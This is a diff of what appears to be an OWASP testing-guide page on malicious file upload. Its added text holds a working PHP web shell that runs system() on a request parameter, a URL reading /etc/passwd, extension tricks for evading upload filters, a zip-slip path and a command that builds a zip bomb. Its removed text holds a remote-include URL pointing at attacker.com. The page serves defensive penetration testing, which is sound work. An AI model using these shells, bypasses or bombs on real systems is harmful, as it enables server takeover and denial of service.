@@ -6,76 +6,122 @@
 
 ## Summary
 
-Many application’s business processes allow for the upload of data/information. We regularly check the validity and security of text but accepting files can introduce even more risk. To reduce the risk we may only accept certain file extensions, but attackers are able to encapsulate malicious code into inert file types. Testing for malicious files verifies that the application/system is able to correctly protect against attackers uploading malicious files.
+Many application’s business processes allow users to upload data to them. Although input validation is widely understood for text-based input fields, it is more complicated to implement when files are accepted. Although many sites implement simple restrictions based on a list of permitted (or blocked) extensions, this is not sufficient to prevent attackers from uploading legitimate file types that have malicious contents.
 
-Vulnerabilities related to the uploading of malicious files is unique in that these “malicious” files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.
+Vulnerabilities related to the uploading of malicious files is unique in that these "malicious" files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.
 
-Finally, “malicious” means different things to different systems, for example Malicious files that may exploit SQL server vulnerabilities may not be considered a “malicious” to a main frame flat file environment.
+Finally, "malicious" means different things to different systems, for example malicious files that may exploit SQL server vulnerabilities may not be considered as "malicious" in an environment using a NoSQL data store.
 
 The application may allow the upload of malicious files that include exploits or shellcode without submitting them to malicious file scanning. Malicious files could be detected and stopped at various points of the application architecture such as: IPS/IDS, application server anti-virus software or anti-virus scanning by application as files are uploaded (perhaps offloading the scanning using SCAP).
 
 ## Example
 
-Suppose a picture sharing application allows users to upload their `.gif` or `.jpg` graphic files to the web site. What if an attacker is able to upload a PHP shell, or exe file, or virus? The attacker may then upload the file that may be saved on the system and the virus may spread itself or through remote processes exes or shell code can be executed.
+A common example of this vulnerability is an application such as a blog or forum that allows users to upload images and other media files. While these are considered safe, if an attacker is able to upload executable code (such as a PHP script), this could allow them to execute operating system commands, read and modify information in the filesystem, access the back end database and fully compromise the server.
 
 ## How to Test
 
 ### Generic Testing Method
 
-- Review the project documentation and use exploratory testing looking at the application/system to identify what constitutes and “malicious” file in your environment.
-- Develop or acquire a known “malicious” file. An [EICAR anti-malware test file](https://2016.eicar.org/85-0-Download.html) can be used as harmless, but widely detected by antivirus software.
-- Try to upload the malicious file to the application/system and verify that it is correctly rejected.
-- If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.
+- Identify the file upload functionality.
+- Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.
+  - If documentation is not available then consider what would be appropriate based on the purpose of the application.
+- Determine how the uploaded files are processed.
+- Obtain or create a set of "malicious" files for testing.
+- Try to upload the "malicious" files to the application and determine whether it is accepted and processed.
 
-### Exploit Payload
+### Malicious File Types
 
-- Using the Metasploit payload generation functionality generates a shellcode as a Windows executable using the Metasploit “msfpayload” command.
-- Submit the executable via the application’s upload functionality and see if it is accepted or properly rejected.
+The simplest checks that an application can do are to determine that only trusted types of files can be uploaded.
 
-### Malicious File
+#### Web Shells
 
-- Develop or create a file that should fail the application malware detection process. There are many available on the Internet such as ducklin.htm or ducklin-html.htm.
-- Submit the executable via the application’s upload functionality and see if it is accepted or properly rejected.
+If the server is configured to execute code, then it may be possible to obtain command execution on the server by uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be configured to execute the code.
 
-[Intended Use - EICAR](https://2016.eicar.org/86-0-Intended-use.html)
+Uploading this kind of shell onto an Internet facing server is dangerous, because it allows anyone who knows (or guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the shell from unauthorised access, such as:
 
-### WebShell Backdoor
+- Uploading the shell with a randomly generated name.
+- Password protecting the shell.
+- Implementing IP based restrictions on the shell.
 
-For example upload the `WebShell-backdoor.php` to the target victim site.
+**Remember to remove the shell when you are done.**
+
+The example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET parameter, and can only be accessed from a specific IP address:
 
 ```php
 <?php
-    if(isset($_REQUEST['rq'])){
-        echo "<pre>";
-        $rq= ($_REQUEST['rq']);
-        /* Replace CENSORED with system ($rq) to activate the sample */
-        CENSORED;
-        echo "</pre>";
-        die;
+    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
+        if(isset($_REQUEST['cmd'])){
+            $cmd = ($_REQUEST['cmd']);
+            echo "<pre>\n";
+            system($cmd);
+            echo "</pre>";
+        }
     }
 ?>
 ```
 
-Once it's uploaded, the testers/hackers may get the password by visiting the URL below.
+Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the "cmd" GET parameter:
 
-`http://TargetVictimSite.com/WebShell-backdoor.php?rq=cat+/etc/passwd`
+`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`
 
-or it may execute by remote file injection as below.
+#### Filter Evasion
 
-`http://TargetVictimSite.com/File.php?include=http://attacker.com/WebShell-backdoor.php`
+The first step is to determine what the filters are allowing or blocking, and where they are implemented. If the restrictions are performed on the client-side using JavaScript, then they can be trivially bypassed with an intercepting proxy.
 
-Other PHP example:
+If the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including:
 
-```php
-<?php @CENSORED($_POST['password']);?>
+- Change the value of `Content-Type` as `image/jpeg` in HTTP request.
+- Change the extensions to a less common extension, such as `file.php5`, `file.shtml`, `file.asa`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`, `file.cshtml`
+- Change the capitalisation of the extension, such as `file.PhP` or `file.AspX`
+- If the request includes multiple file names, change them to different values.
+- Using special trailing characters such as spaces, dots or null characters such as `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`
+- In badly configured versions of nginx, uploading a file as `test.jpg/x.php` may allow it to be executed as `x.php`.
+
+### Malicious File Contents
+
+Once the file type has been validated, it is important to also ensure that the contents of the file are safe. This is significantly harder to do, as the steps required will vary depending on the types of file that are permitted.
+
+#### Malware
+
+Applications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the [EICAR test file](https://www.eicar.org/?page_id=3950), which is an safe file that is flagged as malicious by all anti-malware software.
+
+Depending on the type of application, it may be necessary to test for other dangerous file types, such as Office documents containing malicious macros. Tools such as the [Metasploit Framework](https://github.com/rapid7/metasploit-framework) and the [Social Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) can be used to generate malicious files for various formats.
+
+When this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.
+
+#### Archive Directory Traversal
+
+If the application extracts archives (such as Zip files), then it may be possible to write to unintended locations using directory traversal. This can be exploited by uploading a malicious zip file that contains paths that traverse the file system using sequences such as `..\..\..\..\shell.php`. This technique is discussed further in the [snyk advisory](https://snyk.io/research/zip-slip-vulnerability).
+
+#### Zip Bombs
+
+A [Zip bomb](https://en.wikipedia.org/wiki/Zip_bomb) (more generally known as a decompression bomb) is an archive file that contains a large volume of data. It's intended to cause a denial of service by exhausting the disk space or memory of the target system that tries to extract the archive. Note that although the Zip format is the most example of this, other formats are also affected, including gzip (which is frequently used to compress data in transit).
+
+At its simplest level, a Zip bomb can be created by compressing a large file consisting of a single character. The example below shows how to create a 1MB file that will decompress to 1GB:
+
+```bash
+dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
 ```
 
-> Replace @CENSORED with @eval
+There are a number of methods that can be used to achieve much higher compression ratios, including multiple levels of compression, [abusing the Zip format](https://www.bamsoftware.com/hacks/zipbomb/) and [quines](https://research.swtch.com/zip) (which are archives that contain a copy of themselves, causing infinite recursion).
 
-### Invalid File
+A successful Zip bomb attack will result in a denial of service, and can also lead to increased costs if an auto-scaling cloud platform is used. **Do not carry out this kind of attack unless you have considered these risks and have written approval to do so.**
 
-- Set up the intercepting proxy to capture the “valid” request for an accepted file.
-- Send an “invalid” request through with a valid/acceptable file extension and see if the request is accepted or properly rejected.
+#### XML Files
+
+XML files have a number of potential vulnerabilities such as XML eXternal Entities (XXE) and denial of service attacks such as the [billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack).
+
+These are discussed further in the [Testing for XML Injection](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md) guide.
+
+#### Other File Formats
+
+Many other file formats also have specific security concerns that need to be taken into account, such as:
+
+- CSV files may allow [CSV injection attacks](https://owasp.org/www-community/attacks/CSV_Injection).
+- Office files may contain malicious macros or PowerShell code.
+- PDFs may contain malicious JavaScript.
+
+The permitted file formats should be carefully reviewed for potentially dangerous functionality, and where possible attempts should be made to exploit this during testing.
 
 ### Source Code Review
 
@@ -85,38 +131,10 @@ When there is file upload feature supported, the following API/methods are commo
 - C/C++: `open`, `fopen`
 - PHP: `move_uploaded_file()`, `Readfile`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`
 
-### Evasion of the Filter
-
-The following techniques may be used to bypass the website file upload checking rules and filters.
-
-- Change the value of `Content-Type` as `image/jpeg` in HTTP request
-- Change the extensions as executable extensions such as `file.php5`, `file.shtml`, `file.asa`, `file.cert`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`
-- Changes of capital letters of extensions. such as file.PhP or file.AspX
-- Using special trailing such as spaces, dots or null characters such as `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`
-
-The executable extensions should be in deny list such as `file.php5`, `file.shtml`, `file.asa`, `file.cert`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`
-
-- In IIS6 vulnerability, if the filename is `file.asp;file.jpg`, the file will be executed as `file.asp`:
-
-`http://www.targetVictim.com/path/file.asp;file.jpg`
-
-- In NginX, if the original filename is `test.jpg`, testers/hackers may change it to `test.jpg/x.php`
-
-Once it's uploaded, the file will be executed as `x.php`.
-
-### Zip Files Path
-
-One Zip file may contain the malicious PHP with target purpose path such as `..\\..\\..\\..\\hacker.php`. If the website doesn't check the unzip target path, the hacker.php may unzip to the specified path.
-
-### Zip Bomb
-
-Upload the [ZIP bomb](https://github.com/AbhiAgarwal/notes/wiki/Zip-bomb) file that may cause application denial of service.
-
-- `new File`, `file`, `OutputSteam`, `upload`, `import`, `file_put_contents`, `open`, `fopen`, etc.
-
 ## Related Test Cases
 
 - [Test File Extensions Handling for Sensitive Information](../02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)
+- [Testing for XML Injection](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)
 - [Test Upload of Unexpected File Types](08-Test_Upload_of_Unexpected_File_Types.md)
 
 ## Tools
@@ -124,8 +142,13 @@ Upload the [ZIP bomb](https://github.com/AbhiAgarwal/notes/wiki/Zip-bomb) file t
 - Metasploit's payload generation functionality
 - Intercepting proxy
 
+## Remediation
+
+Fully protecting against malicious file upload can be complex, and the exact steps required will vary depending on the types files that are uploaded, and how the files are processed or parsed on the server. This is discussed more fully in the [File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html).
+
 ## References
 
+- [OWASP - File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
 - [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
 - [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)
 - [Overview of Malicious File Upload Attacks](http://securitymecca.com/article/overview-of-malicious-file-upload-attacks/)
@@ -135,7 +158,3 @@ Upload the [ZIP bomb](https://github.com/AbhiAgarwal/notes/wiki/Zip-bomb) file t
 - [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
 - [Implementing Secure File Upload](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)
 - [Metasploit Generating Payloads](https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads)
-
-## Remediation
-
-While safeguards such as deny lists or allow lists of file extensions, using `Content-Type` from the header, or using a file type recognizer may not always be protections against this type of vulnerability. Every application that accepts files from users must have a mechanism to verify that the uploaded file does not contain malicious code. Uploaded files should never be stored where the users or attackers can directly access them.
